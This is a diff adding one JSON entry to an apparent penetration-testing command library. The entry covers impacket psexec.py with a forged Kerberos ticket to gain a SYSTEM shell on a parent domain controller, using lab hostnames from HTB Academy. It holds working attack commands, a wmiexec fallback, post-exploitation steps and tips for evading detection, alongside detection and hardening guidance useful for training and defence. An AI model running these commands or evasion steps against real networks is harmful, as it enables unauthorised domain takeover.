@@ -1,0 +1,81 @@
+{
+  "id": "ad-psexec-ticket",
+  "name": "psexec.py - Shell via Kerberos Ticket",
+  "command": "psexec.py <domain>/<user>@<target_fqdn> -k -no-pass -target-ip <target_ip>",
+  "description": "Authenticates to a remote host using a Kerberos ticket (KRB5CCNAME) and spawns a SYSTEM shell via psexec technique. -k uses the ccache, -no-pass skips password prompt. Used after ExtraSids golden ticket attack or NoPac to execute commands on the parent DC as SYSTEM. Requires the ccache to be exported in KRB5CCNAME.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Lateral Movement",
+  "subcategory": "Domain Trusts",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "psexec",
+    "kerberos",
+    "ccache",
+    "system-shell",
+    "lateral-movement",
+    "domain-trust"
+  ],
+  "mitre": [
+    "T1021.002"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== PSEXEC.PY vs OTHER IMPACKET EXEC TOOLS ===\n  psexec.py   → installs a service (SVCManager), runs as SYSTEM, interactive shell\n               Loud: creates Windows service (Event 7045), high OPSEC footprint\n  wmiexec.py  → uses WMI, semi-interactive, runs as auth'd user (not SYSTEM by default)\n               Quieter than psexec, still detectable\n  smbexec.py  → uses scheduled task via SMB, runs as SYSTEM\n               Similar footprint to psexec\n\nFor ExtraSids ticket use: psexec.py gives you SYSTEM on the target immediately.\n\n=== REQUIRED SETUP ===\n# Export the forged/obtained ccache\nexport KRB5CCNAME=Administrator.ccache\n\n# Ensure DNS resolves the FQDN (add to /etc/hosts if needed):\necho '172.16.5.5 ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' >> /etc/hosts\n\n# Then run psexec:\npsexec.py LOGISTICS.INLANEFREIGHT.LOCAL/Administrator@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL \\\n  -k -no-pass -target-ip 172.16.5.5\n\n=== WHY FQDN MATTERS FOR KERBEROS ===\nKerberos tickets are issued for a specific service principal (HOST/FQDN).\nIf you use an IP instead of FQDN, Kerberos can't match the ticket → falls back to NTLM.\nAlways use FQDN in the target argument, with -target-ip for routing.\n\n=== WHAT YOU GET ===\n  C:\\Windows\\system32> whoami\n  nt authority\\system\n  C:\\Windows\\system32> hostname\n  ACADEMY-EA-DC01\nFull SYSTEM shell on the parent DC — DCSync, dump ntds.dit, or deploy persistence.\n\n=== CHAIN POSITION ===\nComes after: ticketer.py ExtraSids (ad-ticketer-extrasids) or NoPac ccache\nLeads to: secretsdump.py on parent DC, golden ticket for parent domain persistence",
+  "examples": [
+    {
+      "label": "Shell on parent DC using ExtraSids ticket",
+      "command": "export KRB5CCNAME=Administrator.ccache\npsexec.py LOGISTICS.INLANEFREIGHT.LOCAL/Administrator@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -k -no-pass -target-ip 172.16.5.5"
+    },
+    {
+      "label": "Use wmiexec if psexec fails",
+      "command": "wmiexec.py LOGISTICS.INLANEFREIGHT.LOCAL/Administrator@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -k -no-pass -target-ip 172.16.5.5"
+    }
+  ],
+  "references": [
+    {
+      "title": "Impacket psexec.py",
+      "url": "https://github.com/fortra/impacket/blob/master/examples/psexec.py"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-golden-ticket-mimikatz",
+      "rel": "next",
+      "note": "Leverage trust data for cross-domain forging."
+    }
+  ],
+  "defense": {
+    "why_it_works": "psexec.py authenticates via SMB using the Kerberos ticket from KRB5CCNAME. It connects to the IPC$ share, uses the Service Control Manager (SVCMGR) to install a binary as a Windows service, executes it as SYSTEM, and provides an interactive shell. The DC (or target) trusts the Kerberos ticket presented — after ExtraSids golden ticket injection the ticket carries Enterprise Admin SIDs so the DC grants full access.",
+    "prerequisites": "Valid .ccache file (golden ticket, forged or stolen TGT) exported in KRB5CCNAME environment variable. Target FQDN resolvable (Kerberos requires FQDN — IP auth falls back to NTLM). Network reach to target on TCP 445. Target must accept the authenticated user for ADMIN$/IPC$ access.",
+    "impact": "SYSTEM shell on the target host — highest privilege on the local machine. On a DC this enables NTDS.dit dump, DCSync, registry key creation for persistence, and complete domain compromise.",
+    "detection": "Windows Security Event 7045 (service installation) on the target for a newly-created service (PSEXESVC or custom named). Event 4624 type 3 (network logon) on the target. Event 4672 (special logon with sensitive privileges). File creation in %SystemRoot% (PSEXESVC.exe). SMB connection on port 445 to ADMIN$/IPC$. EDR detects PSEXESVC service pattern and network-to-local-code-execution chain.",
+    "artifacts": "PSEXESVC service in Windows Service Manager (Event 7045); PSEXESVC.exe in C:\\Windows\\; Event 4624 type 3 on target; SMB session logs; network traffic on TCP 445 from attacker's Linux IP.",
+    "prevention": "Disable ADMIN$ and C$ administrative shares on workstations where not needed. Host-based firewall blocking inbound SMB (445) from untrusted source IPs. EDR rules blocking PSEXESVC service pattern. Least-privilege — limit which accounts have ADMIN$ access across hosts. Kerberos ticket lifetime enforcement (short-lived tickets reduce the window for forged ticket use).",
+    "evasion": "Use -service-name to rename the deployed service away from PSEXESVC. Use -remote-exe to supply a custom binary instead of the default PSEXESVC.exe. Alternatively use wmiexec.py or smbexec.py which have different (sometimes lower) footprint. Operate quickly — the ticket and service are short-lived indicators.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1021.002"
+    ],
+    "misconfiguration": "Domain trusts (especially bidirectional and forest trusts) extend authentication boundaries. SID filtering is often disabled on forest trusts to support legacy applications — but this allows an attacker with Domain Admin in a child domain to forge a golden ticket with ExtraSids claiming Domain Admin SID in the parent/trusted forest. Without SID filtering (SIDHistory filtering), domain boundaries offer no security isolation.",
+    "vulnerable_config": "# Bidirectional forest trust without SID filtering:\nGet-ADTrust -Filter * | Select-Object Name, Direction, SIDFilteringQuarantined\n# SIDFilteringQuarantined: False  <-- SID filtering DISABLED\n# Direction: BiDirectional        <-- both domains trust each other\n\n# Child domain to parent: SID filtering is always disabled by default\n# Enterprise Admin SID (S-1-5-21-<root>-519) can be added to ExtraSids\n# Golden ticket with ExtraSids = cross-domain privilege escalation",
+    "secure_config": "# Enable SID filtering on external/forest trusts:\nnetdom trust <TrustingDomain> /domain:<TrustedDomain> /quarantine:yes\n# 'Quarantine' = SID filtering enabled — ExtraSids from other domain are stripped\n\n# For child-to-parent trusts (SID filtering can't be enabled without breaking functionality):\n# Use Selective Authentication instead of full trust\n# Only accounts explicitly granted 'Allowed to Authenticate' can use the trust\nnetdom trust <ParentDomain> /domain:<ChildDomain> /SelectiveAuth:yes\n\n# Restrict SIDHistory (prevents ExtraSids abuse):\n# Audit accounts with SIDHistory:\nGet-ADUser -Filter {SIDHistory -like '*'} -Properties SIDHistory\n\n# Monitor cross-forest authentication:\n# Event 4769 on parent DC with ticket from child domain user"
+  },
+  "tools": [
+    "impacket"
+  ]
+}
